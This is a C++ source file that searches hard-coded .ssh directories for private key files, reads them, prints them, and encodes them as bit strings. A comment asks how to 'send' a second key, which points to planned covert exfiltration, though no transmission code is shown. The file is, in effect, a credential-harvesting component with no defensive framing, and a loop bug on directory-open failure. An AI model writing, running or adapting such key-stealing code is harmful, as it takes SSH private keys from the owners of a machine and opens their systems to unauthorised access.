
/****
compile :  g++ -std=c++11 keyconverter.cpp

Scans computer for ssh keys.
Saves them in a vector of vectors
Converts them to Character then to Int
Finally produces bits of a key

*****/

//TODO: DEBUG!!!
//TODO: producePaths find more paths

//HACK: HOW TO SEND SECOND KEY? <== only one key for now!!
//HACK:


#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <fcntl.h>
#include <bitset>
#include <cstdlib>
#include <sys/stat.h>
#include <dirent.h>


  using namespace std;


#define BYTESIZE 8

/********************
*GLOBAL VARIABLES:
********************/
vector<string> possibleSSHPaths;      //paths to search for .ssh
vector<string> allKeyPaths;           //all keys found in path
vector< vector <string> > allKeys;     //holds keys line by line
//reset the following each time
vector<vector<char> > char_key;   //converted line by line characters
vector<vector<int> > int_key;     //binary key
vector <vector<vector<string> > >ALLBINARYKEYS; //holds all binary keys


//string key converted to line by line chars

/**********
FUNCTIONS:
**********/
//FINDING AND SAVING KEYS
void producePaths();                      //produce path guesses
void findSSHFile();                       //find .ssh, push path into allpaths
void dirFound(vector<string> &possibleP); //remove paths that don't exist
void fill2DAllKeys();                     //put the key into
vector<string> readKey(string keypath);   //read private key, push key allkeys
void filterKey(vector<string> &key);      //remove first & last line of keyfile

//CONVERT TO BINARY
void keyToChar(vector<string> key);      //char by char 2d vector
void charToInt();                        //convert char_key to int
string printBinary(int x);              //returns integer as binary string

//BINARY TO ASCII
string printASCII(string binary );
void getKeyBack(vector<string> binaryKey);  //decode binary

//PRINT
void printVector(vector<string> vec);
void printVector(vector<int> vec);
void printVector2(vector<vector<string> > vec);
void printBinaryKey();
void getBinBack(vector<string> binaryKey);

//BITS ON?
bool isBitOn(int pos, int intvalue);     //is bit 0 a 1? INT
bool isBitOn(int pos, string intBinary); //is bit 0 or 1? STRING

int main(){
  //produces strings of guesses to find .ssh directory
  producePaths();
  //tests guesses and saves paths! skips public keys
  findSSHFile();


  for(int i = 0; i < allKeyPaths.size(); ++i){
      cout << "keypath " << i << " = " << allKeyPaths[i] << endl;
  }

  fill2DAllKeys();
  printVector2(allKeys);
  //cout << "allkeys[0][0] = " << allKeys[0][0] << endl;

  //convert all keys to binary and save
  for(int k = 0; k < allKeys.size(); ++k){
    //fill char_key
    printVector(allKeys[k]);
    keyToChar(allKeys[k]);
    // cout << "printing char_key = \n";
    // for(int i = 0; i < char_key.size(); ++i){
    //   for(int j = 0; j < char_key[i].size(); ++j){cout << char_key[i][j];}cout << endl;}
    // cout << "end printing char_key\n";
    //converts char_key to int_key
    charToInt();
    cout << "printing int_key = \n";
    for(int i = 0; i < int_key.size(); ++i){
      for(int j = 0; j < int_key[i].size(); ++j){cout << int_key[i][j];}cout << "*"<<endl;}
    cout << "end printing int_key\n";

    vector<string> oneline;
    vector<vector <string> > bkey_stanza;
    for(int j = 0; j < int_key.size(); ++j){
      oneline.clear();
      for(int i = 0; i < int_key[j].size(); ++i){
        oneline.push_back(printBinary(int_key[j][i]));
        }
        //oneline.push_back(string("NEWLINE"));
      //  printVector(int_key[j]);
        bkey_stanza.push_back(oneline);
        //printBinaryKey();
      }
      ALLBINARYKEYS.push_back(bkey_stanza);
  }

  cout << "\nALLBINARYKEYS holds all of the keys in binary " << endl;

  cout << "\nDECODE KEYS BINARY ==> ASCII" << endl;
  //get the key back
  for(int i = 0; i < ALLBINARYKEYS.size(); ++i){
    cout << "KEY " << i << " : " << endl;
    for(int j = 0; j < ALLBINARYKEYS[i].size(); ++j){
      getKeyBack(ALLBINARYKEYS[i][j]);
    }
    cout << endl;
  }
 //ALLBINARY KEYS
 //i gives the key, j gives the line and k gives the characters

 for(int j = 0; j < ALLBINARYKEYS[0].size(); ++j){
   getBinBack(ALLBINARYKEYS[0][j]);
 }


  return 0;
}




/*****************************
****FINDING AND SAVING KEYS
**************************/

//produce possible .ssh paths
void producePaths(){
  //OSX
  string path1 = "/Users/home/.ssh";
  string path2 = "/root/.ssh";
  //FIXME: $HOME
  //  string path3 = "$HOME/.ssh";
  //FIXME: use find to find .ssh?

  possibleSSHPaths.push_back(path1);
  possibleSSHPaths.push_back(path2);
    //  possibleSSHPaths.push_back(path3);

  //erase entries that don't exist
  dirFound(possibleSSHPaths);
}

//tests paths, if success save!
void findSSHFile(){
  //do they exist?
  vector<string>::iterator it = possibleSSHPaths.begin();
  struct stat buf;
  DIR *dir;
  struct dirent *dirent_ptr;

  //open each directory
  while(it != possibleSSHPaths.end()){
    dir = NULL;
    dirent_ptr = NULL;
    if((dir = opendir(it->c_str())) == NULL){
      perror("opendir possiblesshpaths: ");
      continue;
      ++it;
    }
    //open each entry
    while((dirent_ptr = readdir(dir)) != NULL){
        memset(&buf, 0, sizeof(buf));
        string temp = string(*it + "/" + string(dirent_ptr->d_name));

        //lstat and check if regular; not then continue
        lstat(temp.c_str(), &buf);
        //is not regular file?
        if(!(S_ISREG(buf.st_mode))){ continue;}

        //regular then open, HACK:check errors
        ifstream file_entry(temp);

        //check if private key
        string firstline;
        getline(file_entry, firstline);
        if(firstline.find("PRIVATE KEY", 0) != string::npos){
          //push it in
          allKeyPaths.push_back(temp);
        }
        file_entry.close();
    }
    ++it;

  }


}

//removes paths that don't exist
void dirFound(vector<string> &possibleP){
  vector<string>::iterator it = possibleP.begin();
  struct stat buf;

  while(it != possibleP.end()){
      memset(&buf, 0, sizeof(buf));
      //remove
      if(lstat(it->c_str(), &buf) < 0){
        //doesn't exist so erase it
        it = possibleP.erase(it);
        continue;
      }
    ++it;
  }

}

//save all Keys into a vector
void fill2DAllKeys(){
  vector<string> temp;

  //for each allKeyPaths
  for(vector<string>::iterator it = allKeyPaths.begin();
    it != allKeyPaths.end(); ++it){

      temp.clear();
      //readKey
      temp = readKey(*it);

      //filter Key
      //filterKey(temp);


      //push it into allKeys
      allKeys.push_back(temp);
  }
  printVector2(allKeys);
}


//needs valid path, returns vector line-by-line of key file
vector<string> readKey(string keypath){
  string line;
  ifstream keyfile(keypath.c_str());
  vector<string> keylines;

  //read keyfile line by line
  while(getline(keyfile, line)){
    keylines.push_back(line+"\n");
    line.clear();
  }

  keyfile.close();
  return keylines;

}

//remove first and last line
void filterKey(vector<string> &key){
  vector<string>::iterator it = key.begin();
  while(it != key.end()){
    //find beginning or end title, pop
    if(it->find("PRIVATE KEY") != string::npos){
        it = key.erase(it);
        continue;
    }
    ++it;
  }
}


/*****************************
****CONVERTING TO BINARY
**************************/

//converts "ABC" to ["A", "B", "C"]
void keyToChar(vector<string> key){
  //one line of the key
  vector<char> one_line;
  char_key.clear();
  for(int i = 0; i < key.size();++i){
    one_line.clear();
    //push each character in
    for(int j = 0; j < key[i].length(); ++j){
      one_line.push_back(key[i][j]);
     }//end inner for loop
     char_key.push_back(one_line);
   }//end outer for loop
}

//["A", "B"...] to [67, 68...]
void charToInt(){
  //convert char_key to int and save in binary_key
  int_key.clear();
  vector<int> tmp;
  for(int i = 0; i < char_key.size(); ++i){
   tmp.clear();
    for(int j = 0; j < char_key[i].size(); ++j){
      tmp.push_back((int)char_key[i][j]);
    }
    int_key.push_back(tmp);
  }
}

//given int print binary
string printBinary(int x){
  string binary = "";
  //converts
  binary = bitset<BYTESIZE>(x).to_string();
  return binary;
}


/*****************************
****PRINTING
**************************/

//prints 1D vector
void printVector(vector<string> vec){
  for(int i = 0; i < vec.size(); ++i ){
    cout << vec[i] << endl;
  }
}

void printVector(vector<int> vec){
  for(int i = 0; i < vec.size(); ++i ){
    cout << vec[i] ;
  }
  cout << endl;
}

void printVector2(vector<vector<string> > vec){
  cout << "entered printVector2" << endl;
  for(int i = 0; i < vec.size(); ++i ){
    cout << "\nbegin key = " << endl;
    cout << vec[i][0] << endl;
    for(int j = 1; j < vec[i].size()-1; ++j){
      cout << vec[i][j] << " ";;
    }
    cout << "\n" << vec[i][vec[i].size()-1] << endl;
    cout << "\nend key." << endl;
  }
}

void printBinaryKey(){
    //int_key
    for(int i = 0; i < int_key.size(); ++i){
      cout << "START LINE = " << endl;
      for(int j = 0; j < int_key[j].size(); ++j){
        cout << printBinary(int_key[i][j]) << endl;
      }
      cout << "LINE END " << endl;
    }
}

/*****************************
****BINARY TO ASCII
**************************/

string printASCII(string binary ){

  unsigned long x  = bitset<BYTESIZE>(binary).to_ulong();
  char castchar[2];
  castchar[0]= (char) x; castchar[1] = '\0';
  string hello = string(castchar);
  return hello;
}

void getKeyBack(vector<string> binaryKey){

  for(int i = 0; i < binaryKey.size(); ++i){
    cout << printASCII(binaryKey[i]);
  }
}

void getBinBack(vector<string> binaryKey){
  for(int i = 0; i < binaryKey.size(); ++i){
    cout << binaryKey[i] << endl;
  }
}

/*****************************
****BITS ON?
**************************/

//which bits are on?
bool isBitOn(int pos, int intvalue){
  string binary = printBinary(intvalue);
  return isBitOn(pos, binary);
}

bool isBitOn(int pos, string intBinary){
  pos =  BYTESIZE - (pos + 1);
  if(pos >= intBinary.length()){
    cerr << "isBitOn Error: position out of range" << endl;
    exit(0);
  }

    return intBinary[pos]=='1'? 1 : 0;
}
